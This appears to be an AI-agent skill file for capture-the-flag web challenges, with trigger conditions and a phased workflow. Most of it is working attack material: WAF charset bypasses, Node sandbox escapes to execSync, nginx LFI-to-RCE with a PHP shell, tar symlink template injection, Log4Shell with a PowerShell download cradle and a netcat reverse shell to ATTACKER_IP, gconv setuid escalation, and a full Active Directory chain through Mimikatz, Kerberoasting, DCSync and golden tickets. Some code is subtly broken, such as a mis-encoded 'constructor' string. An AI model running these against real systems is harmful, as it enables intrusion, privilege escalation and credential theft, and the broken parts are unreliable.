---
name: ctf-web-encoding-bypass
description: "Web challenge encoding/WAF bypass techniques — charset encoding bypass, nginx temp file LFI, Log4Shell JNDI injection, sandbox escape, tar symlink template injection."
---

# CTF Web — Encoding & WAF Bypass

## Trigger

When a CTF challenge involves:
- A WAF that blocks keywords (`;`, `cat`, `flag`, `system`, `exec`) but charset is controllable
- A sandboxed JS/Python execution environment (vm2, pyjail, etc.) with blacklist filters
- LFI with path length restrictions
- A file upload/zip/tar that gets processed by the server
- A Minecraft or game server on non-standard ports

## Workflow

### Phase 1 — Encoding Bypass

**Signal**: WAF checks raw bytes, but server decodes with user-controlled charset.

```
POST /api/ping
Content-Type: application/json; charset=cp037
{"target": "cp037-encoded-payload"}
```

Steps:
1. Identify which charsets the server supports (`cp037`, `cp500`, `utf-7`, etc.)
2. Encode the blacklisted characters in the alternative charset
3. Raw bytes won't match the WAF's ASCII keyword list
4. Server decodes the request body with the specified charset, revealing the payload

**Verification**: Send a harmless test payload (`127.0.0.1`) with the alternative charset first. If it works, the bypass is viable.

### Phase 2 — Sandbox Escape via Promise Thenable

**Signal**: A JS sandbox (e.g. `vm` module) blocks `constructor`, `process`, `then`, etc., but allows basic objects.

```javascript
// vm sandbox blacklists: constructor, then, process, require, __proto__
// Bypass: Promise thenable + String.fromCharCode
let payload = {
  // Dynamic property name using char codes to bypass blacklist
  [String.fromCharCode(116, 104, 101, 110)]: (resolve) => {
    // Reconstruct 'constructor' from char codes
    const c = resolve[String.fromCharCode(99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114)];
    const p = c(String.fromCharCode(112, 114, 111, 99, 101, 115, 115));
    // Now have access to Node.js process
    p[String.fromCharCode(109, 97, 105, 110, 77, 111, 100, 117, 108, 101)]
     [String.fromCharCode(101, 120, 112, 111, 114, 116, 115)]
     [String.fromCharCode(99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114)]
     [String.fromCharCode(99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 104)](...)
  }
};
// Pass as argument to a function that 'awaits' the parameter
```

**Key insight**: Promise resolution can call arbitrary `.then()` method on any object. Combine with `String.fromCharCode` to reconstruct blacklisted property names dynamically.

**Variant — Proxy `get` trap**: If the sandbox blocks `.then` property assignment or dynamic property names, use a Proxy to intercept the `get` trap at runtime instead.

```javascript
// The Proxy's get trap fires at runtime, when the sandbox tries to read .then
// This bypasses AST analysis and string blacklists entirely
function escape(sandbox) {
  let resolver = null;
  const thenable = new Proxy({}, {
    get(target, prop) {
      if (prop === 'then') {
        return (resolve) => {
          resolver = resolve;
          // now 'resolve' is a function from the sandbox's realm
          // use it to access constructor chain
          const c = resolve.constructor;
          const p = c('return process')();
          const req = c('return require')();
          // arbitrary code execution
          p.mainModule.require('child_process').execSync('id');
        };
      }
      return Reflect.get(target, prop);
    }
  });
  return thenable;
}
// Pass to any function that awaits its argument
```

The Proxy's `get` trap fires at runtime (not in source code), bypassing AST analysis and string blacklists that operate at parse time.

### Phase 3 — nginx Temp File LFI → RCE

**Signal**: LFI with path length restrictions (e.g. `(proc|dev|bin|usr|var).{15,}` blocking paths longer than 15 chars after the prefix).

```
# Send a slow GET request with PHP payload in request body
# nginx writes body to a temp file (already unlinked but fd still valid)
# Include via short procfs path:

GET /?f=/proc/11/fd/1/../<candidate_fd>  HTTP/1.1
Content-Length: 1000

<?php system($_GET['x']);?>
```nginx
# The path must be short enough to bypass the blacklist pattern
# Use /proc/<pid>/fd/<n> directly — if > 14 chars use a/../ trick
# /proc/113/fd/8/../../../proc/113/fd/8  →  /proc/113/fd/8/..%2f..%2f..%2f..%2f/proc/113/fd/8
# a/../ trick: if /proc/<pid>/fd/<n> > 14 chars, use chdir to /
# then: /fd/8  (4 chars) or even shorter
```

**`a/../$fd` path-traversal trick**: When the path must be ≤ 14 chars total (blacklist pattern `(proc|dev|bin|usr|var).{15,}`), use PHP's file resolution and a short parent traversal:

```
/?f=./a/../fd/8
  or
/?f=a/../fd/8       # 10 chars — fits easily
```

The trick: PHP resolves `a/../fd/8` from the current working directory to `/fd/8`, which is a symlink to `/proc/self/fd/8` in many setups. If CWD is `/` or web root, this reaches the correct fd.

**Usleep-widening strategy**: nginx unlinks the temp file immediately but keeps the fd alive. To extend the window:
- Send a **larger request body** (100KB+) — nginx buffers to disk more aggressively, keeping the temp file fd open longer
- Use `range` headers or slow POST to keep the connection alive
- Script concurrent race: send the large payload while simultaneously probing `/fd/8`, `/fd/9`, etc. via LFI
- Higher `usleep` values (100-500ms between probes) improve reliability

Steps:
1. Confirm LFI exists and identify the blacklist regex pattern
2. Identify nginx worker PIDs via `/proc/*/net/tcp` or `/proc/*/fdinfo`
3. Find an fd number pointing to the deleted temp file (try fd 7-15)
4. Use short procfs path (`/fd/<n>` or `a/../fd/<n>`) to include the temp file as PHP
5. Execute commands via the query parameter in the PHP payload

### Phase 4 — Race Condition for Privilege Escalation

**Signal**: An async endpoint that temporarily grants admin access via a background heartbeat.

```python
# Race condition pattern:
# 1. Background task periodically resets a "promoted" user list
# 2. A race window exists between verification and the next heartbeat
# 3. Flood the verify endpoint to land inside the window

import requests
import threading

def try_verify():
    while True:
        r = requests.post(url + "/api/verify", json={"user": "attacker"})
        if "admin" in r.text:
            print("GOT ADMIN!", r.cookies)
            break

threads = [threading.Thread(target=try_verify) for _ in range(50)]
for t in threads: t.start()
```

### Phase 5 — Tar Symlink Template Injection

**Signal**: Admin panel with tar upload → extraction (for theming/packaging).

```bash
# Step 1: Create a tar with a directory symlink
mkdir exploit
ln -s /app/templates exploit/tpl
tar cf step1.tar exploit/tpl

# Upload step1.tar → server extracts 'tpl' now points to /app/templates

# Step 2: Create another tar with the file to overwrite
echo '{{ cycler.__init__.__globals__.os.popen("cat /tmp/flag*").read() }}' > admin.html
tar cf step2.tar admin.html

# Upload step2.tar → server writes admin.html to /app/templates/admin.html
# Trigger template rendering by visiting /admin
```

### Phase 6 — Log4Shell (JNDI Injection)

**Signal**: Minecraft server port (25565) or any Java application that logs user-controlled strings.

```
# In Minecraft chat or any user input field:
${jndi:ldap://ATTACKER_IP:1389/Exploit}

# Set up JNDIExploit to serve the payload:
java -jar JNDIExploit.jar -i ATTACKER_IP -p 8888

# JNDIExploit will serve a malicious class that executes:
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/rev.ps1')"
```

### Phase 6a — gconv Module Privilege Escalation (Linux)

**Signal**: Linux machine with a setuid binary (e.g. `pkexec`, `chsh`, `passwd`), ability to write a shared library, and environment variable control via the web app (e.g. LD_PRELOAD, or any env arg injection).

Gconv (iconv) modules let you execute arbitrary code when `iconv_open()` is called with a charset name matching your `.so` file. This can be triggered via setuid binaries that call `iconv_open()` internally.

```bash
# 1. Write a malicious gconv module that reads /flag
cat > gconv-modules << 'MODULES'
module "PAYLOAD//" INTERNAL ../../../tmp/payload 1
MODULES

cat > payload.c << 'C'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
  FILE *f = fopen("/flag", "r");
  if (f) {
    char buf[256] = {0};
    fread(buf, 1, sizeof(buf)-1, f);
    fclose(f);
    // Write flag to a world-readable location
    FILE *out = fopen("/tmp/out", "w");
    if (out) { fwrite(buf, 1, strlen(buf), out); fclose(out); }
  }
  // Or open a reverse shell
  // system("nc ATTACKER_IP 4444 -e /bin/sh");
  exit(0);
}
C

# 2. Compile the shared library
gcc -shared -fPIC -o payload.so payload.c

# 3. Trigger via setuid binary that calls iconv
#    - Example: some shell/exec wrappers
#    - GCONV_PATH environment variable must point to our directory
GCONV_PATH=./ gconvtool --list  # if available, or:
env GCONV_PATH=. /usr/bin/some_setuid_binary
```

**Triggering from a web app**: If the web app allows controlling environment variables or runs shell commands with user-controlled charset names:

```bash
# Via PHP: putenv("GCONV_PATH=/tmp/exploit");
# Via shell injection: GCONV_PATH=/tmp/exploit some_cmd
# Via Python: os.environ['GCONV_PATH'] = '/tmp/exploit'
```

The key requirement is: a setuid binary that calls `iconv_open()` (or any glibc function that internally triggers charset conversion), combined with control over `GCONV_PATH`.

### Phase 7 — Domain Privilege Escalation (AD)

**Signal**: After gaining initial foothold on a domain-joined machine. Multiple hops may be needed to reach Domain Admin.

The full multi-hop AD chain covers: initial foothold → SeImpersonatePrivilege → SYSTEM → LSA Secrets → Kerberoast → ForceChangePassword → DCSync → Domain Admin.

#### Hop 1: Initial Recon

```bash
# BloodHound — map privilege escalation paths
bloodhound-python -u svc_minecraft -p 'password' -d DOMAIN.local -ns DC_IP -c All

# Check for:
# - Users with passwordNotRequired=true
# - Users in Administrators group
# - Users with same name as the DC (not machine account)

# If found: try empty password SMB login
impacket-smbexec DOMAIN/DC01@DC_IP -no-pass
```

#### Hop 2: SeImpersonatePrivilege → SYSTEM

If the initial user has `SeImpersonatePrivilege` (common for service accounts / IIS / SQL Server):

```bash
# Upload and execute a potato exploit (JuicyPotato, PrintSpoofer, GodPotato, etc.)
# These abuse Windows token impersonation to get SYSTEM
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
# Or PrintSpoofer:
PrintSpoofer.exe -i -c cmd.exe

# Verify: whoami → should return NT AUTHORITY\SYSTEM
```

#### Hop 3: SYSTEM → LSA Secrets

Once SYSTEM, dump LSA Secrets to extract service account credentials from the registry:

```bash
# Using Mimikatz on the compromised machine:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::secrets" exit

# Or remotely using impacket:
impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM LOCAL
impacket-secretsdump DOMAIN/COMPUTER\$@TARGET_IP

# Target: extract the NTLM hash or plaintext password of a domain user
# (often a service account like svc_sql, backup_user, etc.)
```

#### Hop 4: Kerberoast — Crack Service Account Hashes

Using the extracted credentials, request TGS tickets for SPNs (Service Principal Names) and crack them offline:

```bash
# Request TGS for all SPNs
impacket-GetUserSPNs DOMAIN/extracted_user:password -dc-ip DC_IP -request -outputfile hashes.txt

# Or with a known hash:
impacket-GetUserSPNs DOMAIN/extracted_user -hashes :NTLM_HASH -dc-ip DC_IP -request -outputfile hashes.txt

# Crack the Kerberos tickets offline with hashcat:
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Target: find a service account whose hash can be cracked, revealing a plaintext password.

#### Hop 5: ForceChangePassword — Escalate Privileges

With the cracked password, check if the compromised user has `ForceChangePassword` rights over a higher-privileged account (use BloodHound output from Hop 1):

```bash
# If svc_account can force change the password of target_user:
impacket-changepasswd DOMAIN/target_user@DC_IP -newpass 'NewP@ss123!' -altuser svc_account -altpass 'cracked_password'

# Or using PowerView (PowerShell):
# Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force) -Credential $cred
```

#### Hop 6: DCSync — Replicate Domain Credentials

Using the escalated account (now with replication rights or DA-equivalent privileges), perform DCSync to extract the full domain credential database:

```bash
# DCSync extracts hashes of ALL domain users including KRBTGT and Domain Admin
impacket-secretsdump DOMAIN/escalated_user:'NewP@ss123!'@DC_IP

# Or extract specific user's hash:
impacket-secretsdump DOMAIN/escalated_user:'NewP@ss123!'@DC_IP -just-dc-user DOMAIN\\Administrator

# The KRBTGT hash enables Golden Ticket attacks for persistent access
```

#### Hop 7: Domain Admin — Read the Flag

With administrative credentials, access any resource on the domain:

```bash
# Use extracted hashes in a Pass-the-Hash attack:
impacket-psexec DOMAIN/Administrator@DC_IP -hashes :ADMIN_NTLM_HASH

# Or use a Golden Ticket:
mimikatz.exe "kerberos::golden /domain:DOMAIN.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt" exit
# Then access the DC:
dir \\DC_IP\C$
type \\DC_IP\C$\flag.txt
```

**Chain summary**: SeImpersonatePrivilege → SYSTEM → LSA Secrets dump → Kerberoast crack → ForceChangePassword on privileged account → DCSync → Domain Admin → flag.

## Pitfalls

1. **Charset not supported** — not all servers support exotic charsets. Check Flask/Starlette docs for which are available
2. **Sandbox bypass fails** — newer vm module versions block more vectors. Check the exact Node.js version
3. **nginx temp file race** — the fd may close before you can include it. Prepare multiple candidate paths
4. **Race window too narrow** — try racing the verify endpoint with 100+ concurrent requests
5. **Tar symlink validation** — newer tar/Node.js may reject symlinks outside extraction root
6. **Log4Shell patching** — Minecraft 1.12.2 is vulnerable; newer versions (1.17+) have the fix
7. **AD user enumeration** — BloodHound defaults may miss `passwordNotRequired`. Always check this attribute explicitly
